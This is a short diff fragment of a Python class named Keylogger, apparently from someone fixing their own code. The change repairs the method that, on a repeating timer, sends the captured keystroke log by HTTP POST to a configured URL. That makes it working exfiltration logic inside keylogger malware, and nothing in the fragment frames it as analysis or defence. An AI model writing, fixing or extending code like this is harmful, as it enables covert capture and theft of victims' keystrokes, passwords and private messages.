@@ -30,15 +30,14 @@ class Keylogger:
 
     def report(self):
         print(self.log)
-        self.send_main(self.email, self.password, self.log)
+        self.send_main()
         self.log = ""
         timer = threading.Timer(self.time_interval, self.report)
         timer.start()
 
     def send_main(self):
-        data_to_send = { 'data': self.log }
-        x = requests.posts(url, data = data_to_send)
-        print(x.text)
+        data_to_send = { 'data': str(self.log) }
+        requests.post(self.url, data = data_to_send)
 
     def start(self):
 
